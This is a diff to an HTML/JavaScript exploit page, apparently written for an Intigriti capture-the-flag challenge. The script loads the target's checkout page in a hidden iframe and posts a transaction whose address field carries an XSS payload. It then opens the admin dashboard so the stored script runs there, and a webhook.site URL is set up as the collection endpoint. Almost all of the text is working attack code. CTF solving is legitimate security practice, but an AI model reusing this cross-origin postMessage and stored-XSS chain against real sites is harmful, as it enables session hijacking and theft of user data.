@@ -6,7 +6,7 @@
 <div id="log"></div>
 <script>
 const T = 'https://challenge-0126.intigriti.io';
-const W = 'https://webhook.site/8089eff3-ae85-4c51-954d-02c7930883b9';
+const W = 'https://webhook.site/8d285b50-124c-4618-8edc-57595e5c4652';
 const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
 let s = 0;
 
@@ -15,19 +15,19 @@ function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+']
 async function exploit() {
     log('STARTING');
 
-    // Load dashboard in iframe (has admin cookies)
-    log('Loading dashboard...');
+    // Load checkout.html in iframe (has postMessage handler and admin cookies)
+    log('Loading checkout...');
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
-    iframe.src = T + '/dashboard.html';
+    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
     document.body.appendChild(iframe);
 
     await new Promise(r => iframe.onload = r);
     await new Promise(r => setTimeout(r, 3000));
-    log('Dashboard loaded');
+    log('Checkout loaded');
 
-    // Send transaction to create entry in dashboard with XSS payload
-    log('Sending transaction with XSS in address...');
+    // Send transaction with XSS payload in address
+    log('Sending transaction with XSS...');
     iframe.contentWindow.postMessage({
         type: 'submitTransaction',
         transaction: {
@@ -36,9 +36,11 @@ async function exploit() {
             amount: 0
         }
     }, '*');
-    log('XSS payload sent');
+    log('Transaction sent');
 
     await new Promise(r => setTimeout(r, 3000));
+
+    // Now open dashboard where XSS will trigger
     log('Opening dashboard to trigger XSS...');
     window.open(T + '/dashboard.html', '_blank');
     log('DONE');
